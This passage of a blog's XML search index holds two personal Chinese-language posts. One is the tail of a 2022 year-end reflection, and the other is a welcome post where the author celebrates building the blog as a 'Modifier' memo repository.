>最后，感谢2022，让我遇到了意趣相投的人，也让我拥有滚烫而又热烈的记忆。</p><p>新的一年，愿我所爱，平安顺遂。🎆</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>乐园入场券</title>
    <link href="/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/"/>
    <url>/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/</url>
    
    <content type="html"><![CDATA[<p>这是一张乐园入场券</p><span id="more"></span><p>恭喜你发现了宝藏！</p><p>成功搭建这个博客这是我上大学以来做过最有成就感的事。虽然过程中踩了很多坑，但感谢我没有放弃，才有了现在这个属于我的小小极乐世界。</p><p>这里是一个Modifier的备忘仓库，也有很多未知宝藏。</p><hr><p>最近在不停地修改我的文章，尽可能的把文章写得简洁明了。</p><p>一些很基础的东西也发上来，一是想记录自己的学习历程，二是想着，等到哪天我的文章也有人看了，能让人一下子就能看得明白。</p><hr><p>如果你看到了这里，那就祝你在Modifier的极乐世界里享受自由与快乐吧！</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
